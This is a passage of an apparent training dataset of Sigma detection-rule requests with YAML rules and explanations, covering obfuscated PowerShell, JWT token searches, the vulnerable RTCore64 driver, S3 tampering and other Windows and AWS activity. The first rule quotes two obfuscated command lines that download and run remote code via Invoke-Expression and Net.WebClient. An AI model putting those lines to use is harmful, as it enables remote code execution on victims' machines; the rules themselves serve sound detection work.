    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        # ImagePath|re: '(?i).*&&set.*(\\{\\d\\}){2,}\\\\\\\"\\s+?\\-f.*&&.*cmd.*\\/c' # FPs with |\\/r\n        # Example 1: CMD /C\"sET KUR=Invoke-Expression (New-Object Net.WebClient).DownloadString&&Set MxI=C:\\wINDowS\\sYsWow64\\winDOWspoWERSheLl\\V1.0\\PowerShelL.EXe ${ExEcut`IoN`cON`TExT}.\\\"invo`kEcoMm`A`ND\\\".( \\\"{2}{1}{0}\\\" -f 'pt','EscRi','INvOk' ).Invoke( ( .( \\\"{0}{1}\\\" -f'D','IR' ) ( \\\"{0}{1}\\\"-f'ENV:kU','R')).\\\"vAl`Ue\\\" )&& CMD /C%mXI%\"\n        # Example 2: c:\\WiNDOWS\\sYSTEm32\\CmD.exE /C \"sEt DeJLz=Invoke-Expression (New-Object Net.WebClient).DownloadString&&set yBKM=PoWERShelL -noeX ^^^&(\\\"{2}{0}{1}\\\"-f '-ItE','m','seT') ( 'V' + 'a'+ 'RiAblE:z8J' +'U2' + 'l' ) ([TYpE]( \\\"{2}{3}{0}{1}\\\"-f 'e','NT','e','NViRONM' ) ) ; ^^^& ( ( [sTrIng]${VE`Rbo`SepReFER`Ence})[1,3] + 'X'-joIN'')( ( (.('gI') ('V' + 'a' + 'RIAbLe:z8j' + 'u2' +'l' ) ).vALUe::( \\\"{2}{5}{0}{1}{6}{4}{3}\\\" -f 'IRo','Nm','GETE','ABlE','I','nv','enTVAr').Invoke(( \\\"{0}{1}\\\"-f'd','ejLz' ),( \\\"{1}{2}{0}\\\"-f'cEss','P','RO') )) )&& c:\\WiNDOWS\\sYSTEm32\\CmD.exE /C %ybkm%\"\n        ImagePath|contains|all:\n            - '&&set'\n            - 'cmd'\n            - '/c'\n            - '-f'\n        ImagePath|contains:\n            - '{0}'\n            - '{1}'\n            - '{2}'\n            - '{3}'\n            - '{4}'\n            - '{5}'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        # ImagePath|re: '(?i).*&&set.*(\\{\\d\\}){2,}\\\\\\\"\\s+?\\-f.*&&.*cmd.*\\/c' # FPs with |\\/r\n        # Example 1: CMD /C\"sET KUR=Invoke-Expression (New-Object Net.WebClient).DownloadString&&Set MxI=C:\\wINDowS\\sYsWow64\\winDOWspoWERSheLl\\V1.0\\PowerShelL.EXe ${ExEcut`IoN`cON`TExT}.\\\"invo`kEcoMm`A`ND\\\".( \\\"{2}{1}{0}\\\" -f 'pt','EscRi','INvOk' ).Invoke( ( .( \\\"{0}{1}\\\" -f'D','IR' ) ( \\\"{0}{1}\\\"-f'ENV:kU','R')).\\\"vAl`Ue\\\" )&& CMD /C%mXI%\"\n        # Example 2: c:\\WiNDOWS\\sYSTEm32\\CmD.exE /C \"sEt DeJLz=Invoke-Expression (New-Object Net.WebClient).DownloadString&&set yBKM=PoWERShelL -noeX ^^^&(\\\"{2}{0}{1}\\\"-f '-ItE','m','seT') ( 'V' + 'a'+ 'RiAblE:z8J' +'U2' + 'l' ) ([TYpE]( \\\"{2}{3}{0}{1}\\\"-f 'e','NT','e','NViRONM' ) ) ; ^^^& ( ( [sTrIng]${VE`Rbo`SepReFER`Ence})[1,3] + 'X'-joIN'')( ( (.('gI') ('V' + 'a' + 'RIAbLe:z8j' + 'u2' +'l' ) ).vALUe::( \\\"{2}{5}{0}{1}{6}{4}{3}\\\" -f 'IRo','Nm','GETE','ABlE','I','nv','enTVAr').Invoke(( \\\"{0}{1}\\\"-f'd','ejLz' ),( \\\"{1}{2}{0}\\\"-f'cEss','P','RO') )) )&& c:\\WiNDOWS\\sYSTEm32\\CmD.exE /C %ybkm%\"\n        ImagePath|contains|all:\n            - '&&set'\n            - 'cmd'\n            - '/c'\n            - '-f'\n        ImagePath|contains:\n            - '{0}'\n            - '{1}'\n            - '{2}'\n            - '{3}'\n            - '{4}'\n            - '{5}'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Obfuscated Powershell via VAR++ LAUNCHER",
      "answer": "In order to detect obfuscated PowerShell via VAR++ LAUNCHER, you should focus on monitoring Windows System logs, specifically looking for events generated by the Service Control Manager with an EventID of 7045. This EventID indicates a service was installed on the system, which can be a normal occurrence. However, the critical aspect to scrutinize is the 'ImagePath' attribute within these events, as attackers often manipulate this to execute malicious PowerShell scripts using obfuscation techniques to evade detection.\n\nLook for 'ImagePath' values that contain a combination of certain patterns and characters, indicating a high likelihood of obfuscated PowerShell commands. Specifically, you should search for occurrences that have:\n\n- The presence of '&&set' followed by 'cmd' and '/c' indicating the execution of a command following the setting of environment variables.\n- The '-f' format operator, which in these contexts is likely used for string manipulation or to format commands in a way that masks their intentions.\n- The use of manipulated braces '{ }', specifically containing numeric placeholders like '{0}', '{1}', '{2}', '{3}', '{4}', '{5}', indicating an attempt to reorder or format strings in a way that might not be immediately apparent, contributing to the obfuscation.\n\nIt's these patterns of string manipulation and command formatting that hint at the obfuscation tactics used to disguise the intended actions of PowerShell scripts, making them less conspicuous to standard detection mechanisms.\n\nIt is important, however, to approach detections with caution as there might be unknown false positives. Given that these detection methods are based on behavior that could potentially be replicated in non-malicious contexts, any alerts should warrant a further investigation rather than immediate action. The level of concern for detections matching these patterns is high, underscoring the necessity for immediate investigation upon detection."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting possible search for office tokens via CLI by looking for the string \"eyJ0eX\". This string is used as an anchor to look for the start of the JWT token used by office and similar apps..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect possible search for office tokens via CLI by looking for the string \"eyJ0eX\". This string is used as an anchor to look for the start of the JWT token used by office and similar apps, you should: Monitor the creation of processes on Windows systems for command lines that contain specific strings, which could indicate an attempt to search for or manipulate JWT tokens associated with Office applications or similar software. The targeted strings to watch for in the command line inputs include 'eyJ0eXAiOi', ' eyJ0eX', ' \"eyJ0eX\"', and \" 'eyJ0eX'\". These strings are part of the structure of JWT tokens and their presence in command lines could signify malicious attempts to interact with these tokens. The detection of such actions is of medium level importance and should be further analyzed, although it's acknowledged that some legitimate actions might be mistakenly identified (false positives are unknown).",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'eyJ0eXAiOi' # {\"typ\":\n            - ' eyJ0eX'\n            - ' \"eyJ0eX\"'\n            - \" 'eyJ0eX'\"\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'eyJ0eXAiOi' # {\"typ\":\n            - ' eyJ0eX'\n            - ' \"eyJ0eX\"'\n            - \" 'eyJ0eX'\"\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "possible search for office tokens via CLI by looking for the string \"eyJ0eX\". This string is used as an anchor to look for the start of the JWT token used by office and similar apps.",
      "answer": "In order to detect possible search for office tokens via CLI by looking for the string \"eyJ0eX\". This string is used as an anchor to look for the start of the JWT token used by office and similar apps, you should: Monitor the creation of processes on Windows systems for command lines that contain specific strings, which could indicate an attempt to search for or manipulate JWT tokens associated with Office applications or similar software. The targeted strings to watch for in the command line inputs include 'eyJ0eXAiOi', ' eyJ0eX', ' \"eyJ0eX\"', and \" 'eyJ0eX'\". These strings are part of the structure of JWT tokens and their presence in command lines could signify malicious attempts to interact with these tokens. The detection of such actions is of medium level importance and should be further analyzed, although it's acknowledged that some legitimate actions might be mistakenly identified (false positives are unknown)."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting installation of RTCore service. Which could be an indication of Micro-Star MSI Afterburner vulnerable driver abuse.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the installation of RTCore service, which could be an indication of Micro-Star MSI Afterburner vulnerable driver abuse, you should: Monitor Windows system logs for entries that indicate the creation or modification of a service. Specifically, look for logs sourced from the Service Control Manager with an EventID of 7045, signaling a service was installed. Pay special attention to the service named 'RTCore64'. This particular service installation event is significant as it might be related to the abuse of a vulnerable driver associated with Micro-Star MSI Afterburner, a popular graphics card overclocking tool. This type of activity could potentially be utilized by attackers to gain unauthorized access or privileges within a system. Be mindful that some detections might be false positives, as not all instances of this service installation are malicious. Nonetheless, such events should be considered highly suspicious and warrant further investigation due to their potential security implications.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ServiceName: 'RTCore64'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ServiceName: 'RTCore64'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "installation of RTCore service. Which could be an indication of Micro-Star MSI Afterburner vulnerable driver abuse",
      "answer": "In order to detect the installation of RTCore service, which could be an indication of Micro-Star MSI Afterburner vulnerable driver abuse, you should: Monitor Windows system logs for entries that indicate the creation or modification of a service. Specifically, look for logs sourced from the Service Control Manager with an EventID of 7045, signaling a service was installed. Pay special attention to the service named 'RTCore64'. This particular service installation event is significant as it might be related to the abuse of a vulnerable driver associated with Micro-Star MSI Afterburner, a popular graphics card overclocking tool. This type of activity could potentially be utilized by attackers to gain unauthorized access or privileges within a system. Be mindful that some detections might be false positives, as not all instances of this service installation are malicious. Nonetheless, such events should be considered highly suspicious and warrant further investigation due to their potential security implications."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Wscript/Cscript executing a file with an uncommon (i.e. non-script) extension.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Wscript/Cscript executing a file with an uncommon (i.e. non-script) extension, you should: monitor process creation events on Windows systems specifically for occurrences where the processes named `wscript.exe` or `cscript.exe` are initiated. These processes are Windows Script Host utilities used to execute scripts on the Windows operating system. Their execution becomes suspicious when they attempt to run files with extensions that are typically associated with non-executable, and often data-only, file types such as `.csv`, `.dat`, `.doc`, `.gif`, `.jpeg`, `.jpg`, `.png`, `.ppt`, `.txt`, `.xls`, and `.xml`. This behavior could indicate an attempt to bypass security controls by executing malicious code hidden within files that appear benign. Detecting this can be pivotal in identifying and countering scripts that exploit these utilities for malicious purposes like malware infection, data exfiltration, or other threats. The detection requires checking both the original file name and the path ending for the processes `wscript.exe` and `cscript.exe`, in conjunction with observing the command line for the inclusion of the specified unconventional file extensions. It's important to be vigilant for such activities, although one must also consider that in some rare and less clear scenarios, legitimate scripts may perform unusual actions, leading to potential false positives. The risk level associated with this detection is deemed high due to the unconventional use of script host utilities that could signify malicious intent.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName:\n            - 'wscript.exe'\n            - 'cscript.exe'\n        - Image|endswith:\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n    selection_extension:\n        CommandLine|contains:\n            # Note: add additional potential suspicious extension\n            # We could specify the \"//E:\" flag to avoid typos by admin. But since that's prone to blind spots via the creation of assoc it's better not to include it\n            - '.csv'\n            - '.dat'\n            - '.doc'\n            - '.gif'\n            - '.jpeg'\n            - '.jpg'\n            - '.png'\n            - '.ppt'\n            - '.txt'\n            - '.xls'\n            - '.xml'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName:\n            - 'wscript.exe'\n            - 'cscript.exe'\n        - Image|endswith:\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n    selection_extension:\n        CommandLine|contains:\n            # Note: add additional potential suspicious extension\n            # We could specify the \"//E:\" flag to avoid typos by admin. But since that's prone to blind spots via the creation of assoc it's better not to include it\n            - '.csv'\n            - '.dat'\n            - '.doc'\n            - '.gif'\n            - '.jpeg'\n            - '.jpg'\n            - '.png'\n            - '.ppt'\n            - '.txt'\n            - '.xls'\n            - '.xml'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Wscript/Cscript executing a file with an uncommon (i.e. non-script) extension",
      "answer": "In order to detect Wscript/Cscript executing a file with an uncommon (i.e. non-script) extension, you should: monitor process creation events on Windows systems specifically for occurrences where the processes named `wscript.exe` or `cscript.exe` are initiated. These processes are Windows Script Host utilities used to execute scripts on the Windows operating system. Their execution becomes suspicious when they attempt to run files with extensions that are typically associated with non-executable, and often data-only, file types such as `.csv`, `.dat`, `.doc`, `.gif`, `.jpeg`, `.jpg`, `.png`, `.ppt`, `.txt`, `.xls`, and `.xml`. This behavior could indicate an attempt to bypass security controls by executing malicious code hidden within files that appear benign. Detecting this can be pivotal in identifying and countering scripts that exploit these utilities for malicious purposes like malware infection, data exfiltration, or other threats. The detection requires checking both the original file name and the path ending for the processes `wscript.exe` and `cscript.exe`, in conjunction with observing the command line for the inclusion of the specified unconventional file extensions. It's important to be vigilant for such activities, although one must also consider that in some rare and less clear scenarios, legitimate scripts may perform unusual actions, leading to potential false positives. The risk level associated with this detection is deemed high due to the unconventional use of script host utilities that could signify malicious intent."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious process injection using ZOHO's dctask64.exe.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious process injection using ZOHO's dctask64.exe, you should: Focus on monitoring process creation events within Windows environments. Specifically, watch for the initiation of processes where the image name ends with '\\dctask64.exe'. However, it's important to differentiate between legitimate and potentially malicious activity. To do this, exclude any process creation events where the command line includes 'DesktopCentral_Agent\\agent', as this would typically indicate normal operation of ZOHO Desktop Central. The key fields to scrutinize in these events are CommandLine, ParentCommandLine, and ParentImage. Be mindful that there are some instances where false positives may occur, although they are currently unspecified. This activity is considered high risk, indicating that such detections should be prioritized for investigation due to their potential link with unauthorized process injection attempts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dctask64.exe'\n    filter:\n        CommandLine|contains: 'DesktopCentral_Agent\\agent'\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - ParentImage\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dctask64.exe'\n    filter:\n        CommandLine|contains: 'DesktopCentral_Agent\\agent'\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - ParentImage\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious process injection using ZOHO's dctask64.exe",
      "answer": "In order to detect suspicious process injection using ZOHO's dctask64.exe, you should: Focus on monitoring process creation events within Windows environments. Specifically, watch for the initiation of processes where the image name ends with '\\dctask64.exe'. However, it's important to differentiate between legitimate and potentially malicious activity. To do this, exclude any process creation events where the command line includes 'DesktopCentral_Agent\\agent', as this would typically indicate normal operation of ZOHO Desktop Central. The key fields to scrutinize in these events are CommandLine, ParentCommandLine, and ParentImage. Be mindful that there are some instances where false positives may occur, although they are currently unspecified. This activity is considered high risk, indicating that such detections should be prioritized for investigation due to their potential link with unauthorized process injection attempts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting blocking of process creations originating from PSExec and WMI commands.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect blocking of process creations originating from PSExec and WMI commands, you should monitor Windows Defender events. Specifically, capture logs from Windows Defender (WinDefend) with the requirement of having \"Block process creations originating from PSExec and WMI commands\" from Attack Surface Reduction configured. Look for Event ID 1121, which indicates an execution attempt blocked by this rule, and focus on processes ending with '\\wmiprvse.exe' or '\\psexesvc.exe'. These entries are crucial as they signify blocked attempts to create processes via Windows Management Instrumentation (WMI) and PSExec, respectively. The detection of such events is of high importance due to the potential misuse of these tools in cyber attacks, involving tactics and techniques such as Execution, Persistence, Privilege Escalation, and Defense Evasion.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: windefend\n    definition: 'Requirements:Enabled Block process creations originating from PSExec and WMI commands from Attack Surface Reduction (GUID: d1e49aac-8f56-4280-b9ba-993a6d77406c)'\ndetection:\n    selection:\n        EventID: 1121\n        ProcessName|endswith:\n            - '\\wmiprvse.exe'\n            - '\\psexesvc.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: windefend\n    definition: 'Requirements:Enabled Block process creations originating from PSExec and WMI commands from Attack Surface Reduction (GUID: d1e49aac-8f56-4280-b9ba-993a6d77406c)'\ndetection:\n    selection:\n        EventID: 1121\n        ProcessName|endswith:\n            - '\\wmiprvse.exe'\n            - '\\psexesvc.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "blocking of process creations originating from PSExec and WMI commands",
      "answer": "In order to detect blocking of process creations originating from PSExec and WMI commands, you should monitor Windows Defender events. Specifically, capture logs from Windows Defender (WinDefend) with the requirement of having \"Block process creations originating from PSExec and WMI commands\" from Attack Surface Reduction configured. Look for Event ID 1121, which indicates an execution attempt blocked by this rule, and focus on processes ending with '\\wmiprvse.exe' or '\\psexesvc.exe'. These entries are crucial as they signify blocked attempts to create processes via Windows Management Instrumentation (WMI) and PSExec, respectively. The detection of such events is of high importance due to the potential misuse of these tools in cyber attacks, involving tactics and techniques such as Execution, Persistence, Privilege Escalation, and Defense Evasion."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting ping command that uses a hex encoded IP address.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a ping command that uses a hex encoded IP address, you should monitor process creation logs on Windows systems for occurrences where the 'ping.exe' process is executed with a command line that includes hexadecimal IP addresses. Specifically, look for the execution path ending with '\\ping.exe' and command line arguments containing '0x', which suggests a hexadecimal value is being used. For analysis, make sure to capture the ParentCommandLine fields as it might provide additional context about the execution. This activity is flagged with a high level of suspicion as under normal circumstances, administrators do not use hexadecimal IP addresses with ping commands, making legitimate use cases highly unlikely.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ping.exe'\n        CommandLine|contains: '0x'\n    condition: selection\nfields:\n    - ParentCommandLine\nfalsepositives:\n    - Unlikely, because no sane admin pings IP addresses in a hexadecimal form\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ping.exe'\n        CommandLine|contains: '0x'\n    condition: selection\nfields:\n    - ParentCommandLine\nfalsepositives:\n    - Unlikely, because no sane admin pings IP addresses in a hexadecimal form\nlevel: high\n",
      "question": "ping command that uses a hex encoded IP address",
      "answer": "In order to detect a ping command that uses a hex encoded IP address, you should monitor process creation logs on Windows systems for occurrences where the 'ping.exe' process is executed with a command line that includes hexadecimal IP addresses. Specifically, look for the execution path ending with '\\ping.exe' and command line arguments containing '0x', which suggests a hexadecimal value is being used. For analysis, make sure to capture the ParentCommandLine fields as it might provide additional context about the execution. This activity is flagged with a high level of suspicion as under normal circumstances, administrators do not use hexadecimal IP addresses with ping commands, making legitimate use cases highly unlikely."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting user tampers with S3 data management in Amazon Web Services..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a user tampers with S3 data management in Amazon Web Services, you should: Observe AWS CloudTrail logs for actions that modify S3 bucket configurations. Specifically, look for events where the `eventSource` is `s3.amazonaws.com` and the `eventName` includes activities such as enabling bucket logging (`PutBucketLogging`), setting up a bucket to serve a website (`PutBucketWebsite`), changing the bucket's encryption settings (`PutEncryptionConfiguration`), adjusting lifecycle configurations (`PutLifecycleConfiguration`), modifying replication settings (`PutReplicationConfiguration`), replicating objects (`ReplicateObject`), or restoring objects (`RestoreObject`). These activities could indicate unauthorized attempts to alter how S3 data is managed, stored, or accessed. It\u2019s important to note that while these events can be indicative of tampering, changes to S3 configurations might sometimes be performed by system or network administrators as part of legitimate operations. Therefore, it\u2019s essential to verify if the changes were made by recognized and authorized entities in your environment. Suspicious activities, especially those initiated by unfamiliar users or hosts, should be investigated thoroughly. Known legitimate behaviors causing alerts should be documented and can be configured to bypass this detection mechanism to reduce false positives. This observation has a low level of alert severity but is critical for maintaining the integrity and security of S3 data management.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: s3.amazonaws.com\n        eventName:\n            - PutBucketLogging\n            - PutBucketWebsite\n            - PutEncryptionConfiguration\n            - PutLifecycleConfiguration\n            - PutReplicationConfiguration\n            - ReplicateObject\n            - RestoreObject\n    condition: selection\nfalsepositives:\n    - A S3 configuration change may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. S3 configuration change from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: s3.amazonaws.com\n        eventName:\n            - PutBucketLogging\n            - PutBucketWebsite\n            - PutEncryptionConfiguration\n            - PutLifecycleConfiguration\n            - PutReplicationConfiguration\n            - ReplicateObject\n            - RestoreObject\n    condition: selection\nfalsepositives:\n    - A S3 configuration change may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. S3 configuration change from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: low\n",
      "question": "user tampers with S3 data management in Amazon Web Services.",
      "answer": "In order to detect when a user tampers with S3 data management in Amazon Web Services, you should: Observe AWS CloudTrail logs for actions that modify S3 bucket configurations. Specifically, look for events where the `eventSource` is `s3.amazonaws.com` and the `eventName` includes activities such as enabling bucket logging (`PutBucketLogging`), setting up a bucket to serve a website (`PutBucketWebsite`), changing the bucket's encryption settings (`PutEncryptionConfiguration`), adjusting lifecycle configurations (`PutLifecycleConfiguration`), modifying replication settings (`PutReplicationConfiguration`), replicating objects (`ReplicateObject`), or restoring objects (`RestoreObject`). These activities could indicate unauthorized attempts to alter how S3 data is managed, stored, or accessed. It\u2019s important to note that while these events can be indicative of tampering, changes to S3 configurations might sometimes be performed by system or network administrators as part of legitimate operations. Therefore, it\u2019s essential to verify if the changes were made by recognized and authorized entities in your environment. Suspicious activities, especially those initiated by unfamiliar users or hosts, should be investigated thoroughly. Known legitimate behaviors causing alerts should be documented and can be configured to bypass this detection mechanism to reduce false positives. This observation has a low level of alert severity but is critical for maintaining the integrity and security of S3 data management."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting that the path to the DLL written in the registry is different from the default one. Launched WAB.exe tries to load the DLL from Registry..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect that the path to the DLL written in the registry is different from the default one when WAB.exe tries to load the DLL from Registry, you should:\n\nMonitor the Windows system for registry settings modifications, specifically focusing on events where there's a change in the values set under the registry path associated with the Windows Address Book (WAB) application. Look for events categorized under registry modifications (registry_set) with an event type of SetValue that indicates a new value assignment within the registry. This monitoring should narrowly focus on changes to the '\\Software\\Microsoft\\WAB\\DLLPath' within the registry. It's crucial to filter out and ignore modifications where the DLL path points to the default '%CommonProgramFiles%\\System\\wab32.dll' to reduce false positives, thereby concentrating on non-standard or potentially malicious changes. This approach helps in identifying scenarios where an attacker might attempt to divert the standard DLL loading process to a malicious DLL, a common technique in persistence mechanisms and method of attack execution by loading unauthorized or malicious code. Implementing such monitoring ensures a high level of scrutiny in detecting anomalies in modifications of the registry paths that are critical to the loading of legitimate software, such as the WAB application. This monitoring strategy is aimed at addressing tactics and techniques that involve Persistence, Privilege Escalation, and Defense Evasion, by noting unusual changes in DLL path settings in the Windows registry.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\Software\\Microsoft\\WAB\\DLLPath'\n    filter:\n        Details: '%CommonProgramFiles%\\System\\wab32.dll'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\Software\\Microsoft\\WAB\\DLLPath'\n    filter:\n        Details: '%CommonProgramFiles%\\System\\wab32.dll'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "that the path to the DLL written in the registry is different from the default one. Launched WAB.exe tries to load the DLL from Registry.",
      "answer": "In order to detect that the path to the DLL written in the registry is different from the default one when WAB.exe tries to load the DLL from Registry, you should:\n\nMonitor the Windows system for registry settings modifications, specifically focusing on events where there's a change in the values set under the registry path associated with the Windows Address Book (WAB) application. Look for events categorized under registry modifications (registry_set) with an event type of SetValue that indicates a new value assignment within the registry. This monitoring should narrowly focus on changes to the '\\Software\\Microsoft\\WAB\\DLLPath' within the registry. It's crucial to filter out and ignore modifications where the DLL path points to the default '%CommonProgramFiles%\\System\\wab32.dll' to reduce false positives, thereby concentrating on non-standard or potentially malicious changes. This approach helps in identifying scenarios where an attacker might attempt to divert the standard DLL loading process to a malicious DLL, a common technique in persistence mechanisms and method of attack execution by loading unauthorized or malicious code. Implementing such monitoring ensures a high level of scrutiny in detecting anomalies in modifications of the registry paths that are critical to the loading of legitimate software, such as the WAB application. This monitoring strategy is aimed at addressing tactics and techniques that involve Persistence, Privilege Escalation, and Defense Evasion, by noting unusual changes in DLL path settings in the Windows registry."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting The DNS Z flag is bit within the DNS protocol header that is, per the IETF design, meant to be used reserved (unused).\nAlthough recently it has been used in DNSSec, the value being set to anything other than 0 should be rare.\nOtherwise if it is set to non 0 and DNSSec is being used, then excluding the legitimate domains is low effort and high reward.\nDetermine if multiple of these files were accessed in a short period of time to further enhance the possibility of seeing if this was a one off or the possibility of larger sensitive file gathering.\nThis Sigma query is designed to accompany the Corelight Threat Hunting Guide, which can be found here: https://www3.corelight.com/corelights-introductory-guide-to-threat-hunting-with-zeek-bro-logs'\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect misuse of the DNS Z flag, which is a bit within the DNS protocol header designed to be unused but has occasionally been employed in DNSSec, you should: Monitor DNS traffic for queries where the Z flag is not set to 0, indicating a deviation from standard behavior, which could be a sign of malicious activity. You should focus on DNS queries that contain a dot, suggesting they are directed towards fully qualified domain names, yet exclude certain top-level domains such as '.arpa', '.local', '.ultradns.net', '.twtrdns.net', '.azuredns-prd.info', '.azure-dns.com', '.azuredns-ff.info', '.azuredns-ff.org', '.azuregov-dns.org' to minimize false positives from legitimate DNS traffic. Additionally, DNS queries seeking name server (NS) and mail exchange (MX) records should be left out of the monitoring scope, as well as any DNS responses ending with a null character, which could indicate non-standard or malicious responses. Monitoring should also disregard traffic to well-known NetBIOS ports (137, 138, 139) since this traffic is unrelated to DNS and could lead to false alerts. Keep an eye on fields such as timestamp, source and destination IPs and ports, protocol, DNS query type names and codes, queries and their answers, response codes, transaction IDs, time-to-live (TTL) values, and authoritative answer flags to build a comprehensive picture of any potentially malicious DNS activity. Bear in mind that encountering DNS queries with non-zero Z flag values could occasionally result from internal or legitimate external domains utilizing DNSSec; such instances should be verified and, if deemed legitimate, excluded from alerts. Special consideration should also be given to domains ending in '.edu', '.gov', and '.mil', especially in environments like the public sector, to minimize false positives. This approach aligns with medium-level security monitoring, leveraging the Corelight Threat Hunting Guide's recommendations for using Zeek (Bro) logs to identify potentially malicious activity.",
    "context": "",
